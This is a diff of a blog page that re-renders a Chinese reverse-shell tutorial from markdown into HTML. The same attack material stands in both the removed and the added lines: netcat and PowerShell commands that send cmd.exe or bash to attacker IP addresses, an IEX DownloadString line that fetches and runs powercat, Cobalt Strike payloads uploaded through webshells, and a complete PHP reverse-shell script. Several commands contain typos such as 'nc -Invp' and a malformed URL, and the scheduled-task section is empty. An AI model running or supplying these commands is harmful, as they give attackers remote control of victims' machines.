@@ -56,100 +56,48 @@
     </div>
   </header>
   <div class="article-content">
-    
-# 反弹shell
-
-攻击者指定服务端，受害者主机主动连接攻击者的服务端程序
-
-利用场景：
-
-1.目标机因防火墙受限，目标机器只能发送请求，不能接收请求。
-
-2.目标机端口被占用。
-
-3.目标机位于局域网，或IP会动态变化，攻击机无法直接连接。
-
-4.对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知的。
-
-## 1.windows反弹shell
-
-### cmd反弹
-
-借助nc工具
-
-步骤:
-
-上传nc.exe 到服务器
-
-本地监听特殊端口号
-
+    <h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><p>攻击者指定服务端，受害者主机主动连接攻击者的服务端程序</p>
+<p>利用场景：</p>
+<p>1.目标机因防火墙受限，目标机器只能发送请求，不能接收请求。</p>
+<p>2.目标机端口被占用。</p>
+<p>3.目标机位于局域网，或IP会动态变化，攻击机无法直接连接。</p>
+<p>4.对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知的。</p>
+<h2 id="1-windows反弹shell"><a href="#1-windows反弹shell" class="headerlink" title="1.windows反弹shell"></a>1.windows反弹shell</h2><h3 id="cmd反弹"><a href="#cmd反弹" class="headerlink" title="cmd反弹"></a>cmd反弹</h3><p>借助nc工具</p>
+<p>步骤:</p>
+<p>上传nc.exe 到服务器</p>
+<p>本地监听特殊端口号</p>
 <figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc.exe -lnvp 2333</span><br><span class="line">nc -Invp 2333</span><br><span class="line">netcat.exe -lnvp 2333</span><br><span class="line">ncat -lnvp 2333</span><br></pre></td></tr></table></figure>
 
-服务器端反弹Shell
-
+<p>服务器端反弹Shell</p>
 <figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc.exe -e cmd.exe 10.4.7.1 2333</span><br><span class="line">/c C:\RECYCLER\nc.exe -e cmd.exe 10.9.69.77 2333</span><br><span class="line">/c C:\RECYCLER\pr.exe &quot;C:\RECYCLER\nc.exe -e cmd.exe 10.9.69.77 2333&quot;</span><br></pre></td></tr></table></figure>
 
-### powershell反弹
-
-本地监听特殊端口号
-
+<h3 id="powershell反弹"><a href="#powershell反弹" class="headerlink" title="powershell反弹"></a>powershell反弹</h3><p>本地监听特殊端口号</p>
 <figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -1 -p 9999</span><br></pre></td></tr></table></figure>
 
-服务端反弹shell
-
+<p>服务端反弹shell</p>
 <figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object</span><br><span class="line">System. Net.Webclient).DownloadString(&#x27;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#x27;)<span class="comment">;</span></span><br><span class="line">powercat -c 10.4.7.1 -p 1234 -e cmd</span><br><span class="line"></span><br><span class="line">python3 -m http.server 80</span><br><span class="line"></span><br><span class="line">powershell IEX (New-Object System. Net.Webclient) .DownloadString( http.//10.4.7.1/powercat.ps1&#x27;)<span class="comment">; powercat -c 10.4.7.1</span></span><br><span class="line">-p 1234 -e cmd</span><br></pre></td></tr></table></figure>
 
-### 利用Cobalt Strike
-
-使用Cobalt Strike生成反弹shell的可执行程序，通过蚁剑，冰蝎上传到低权限目录
-
-常见低权限目录：
-
-C:\Windows\Temp
-
-C:\Windows\Tasks
-
-C:\Users\Public
-
-1.Cobalt Strike + 蚁剑
-
-2.Cobalt Strike + 冰蝎
-
-## 2.Linux反弹shell
-
-### bash反弹
-
-攻击机建立监听器
-
-![image-20260604112243236](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260604112243236.png)
-
-目标机器执行
-
+<h3 id="利用Cobalt-Strike"><a href="#利用Cobalt-Strike" class="headerlink" title="利用Cobalt Strike"></a>利用Cobalt Strike</h3><p>使用Cobalt Strike生成反弹shell的可执行程序，通过蚁剑，冰蝎上传到低权限目录</p>
+<p>常见低权限目录：</p>
+<p>C:\Windows\Temp</p>
+<p>C:\Windows\Tasks</p>
+<p>C:\Users\Public</p>
+<p>1.Cobalt Strike + 蚁剑</p>
+<p>2.Cobalt Strike + 冰蝎</p>
+<h2 id="2-Linux反弹shell"><a href="#2-Linux反弹shell" class="headerlink" title="2.Linux反弹shell"></a>2.Linux反弹shell</h2><h3 id="bash反弹"><a href="#bash反弹" class="headerlink" title="bash反弹"></a>bash反弹</h3><p>攻击机建立监听器</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260604112243236.png" alt="image-20260604112243236"></p>
+<p>目标机器执行</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.243.3 4444 -e /bin/bash</span><br></pre></td></tr></table></figure>
 
-### PHP反弹
-
-攻击机建立监听器
-
-![image-20260604112243236](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260604112243236.png)
-
-目标机器执行
-
+<h3 id="PHP反弹"><a href="#PHP反弹" class="headerlink" title="PHP反弹"></a>PHP反弹</h3><p>攻击机建立监听器</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260604112243236.png" alt="image-20260604112243236"></p>
+<p>目标机器执行</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;shell.php&#x27;</span></span><br></pre></td></tr></table></figure>
 
-shell.php文件内容：
-
+<p>shell.php文件内容：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ip</span> = <span class="string">&quot;192.168.243.3&quot;</span>;</span><br><span class="line"><span class="variable">$port</span> = <span class="number">4444</span>;</span><br><span class="line"><span class="variable">$socket</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$ip</span>, <span class="variable">$port</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$socket</span>) <span class="keyword">die</span>();</span><br><span class="line"><span class="variable">$process</span> = <span class="title function_ invoke__">proc_open</span>(<span class="string">&quot;/bin/sh&quot;</span>, [</span><br><span class="line">    <span class="number">0</span> =&gt; <span class="variable">$socket</span>,</span><br><span class="line">    <span class="number">1</span> =&gt; <span class="variable">$socket</span>,</span><br><span class="line">    <span class="number">2</span> =&gt; <span class="variable">$socket</span> </span><br><span class="line">], <span class="variable">$pipes</span>);</span><br><span class="line"><span class="title function_ invoke__">proc_close</span>(<span class="variable">$process</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$socket</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-###  计划任务反弹
-
-## 3.非交互式shell到交互式shell
-
-python -c "import pty; pty.spawn('/bin/bash');"
-
-
-
-
+<h3 id="计划任务反弹"><a href="#计划任务反弹" class="headerlink" title="计划任务反弹"></a>计划任务反弹</h3><h2 id="3-非交互式shell到交互式shell"><a href="#3-非交互式shell到交互式shell" class="headerlink" title="3.非交互式shell到交互式shell"></a>3.非交互式shell到交互式shell</h2><p>python -c “import pty; pty.spawn(‘&#x2F;bin&#x2F;bash’);”</p>
 
   </div>
 </article>
